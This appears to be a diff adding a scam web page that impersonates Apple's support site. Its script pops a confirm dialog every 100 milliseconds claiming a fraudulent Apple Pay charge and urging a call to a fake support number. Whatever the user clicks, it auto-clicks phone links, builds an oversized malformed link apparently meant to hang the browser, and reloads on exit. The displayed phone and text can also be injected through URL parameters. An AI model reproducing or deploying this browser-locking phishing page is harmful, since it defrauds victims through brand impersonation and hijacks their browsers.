+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
+        </div>
+    </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
+
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support ++1-866-381-7391 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-cont">
+                        <div class="as-banner-image as-banner-image--top">
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("images/contact-us-hero.image.large_2x.jpg");
+                                }
+
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
+
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("images/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="images/contact-us-hero.image.small_2x.jpg 735w, images/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="images/contact-us-hero.image.large_2x.jpg">
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock">
+                        </p></div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
+                </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="images/us.png" alt="" width="16" height="16">United
+					States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2025 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
+                </div>
+                <meta content="Apple" property="name">
+                <meta content="++1-866-381-7391
+			 " property="telephone">
+            </section>
+        </div>
+    </footer>
+
+
+
+    <script src="js/jquery-1.12.0.min.js"></script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
+            }
+        };
+
+
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
+
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
+
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
+
+        window.number = getPar('phone');
+
+        window.number = (window.number ? window.number : '++1-866-381-7391');
+
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
+
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
+        }
+
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:++1-866-381-7391"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            if (confirm("Your Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support ++1-866-381-7391 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
+    </script>
+
+
+
+<script defer="" data-domain="iosmd.sire" src="js/script.js"></script>
+
+
+</body></html>
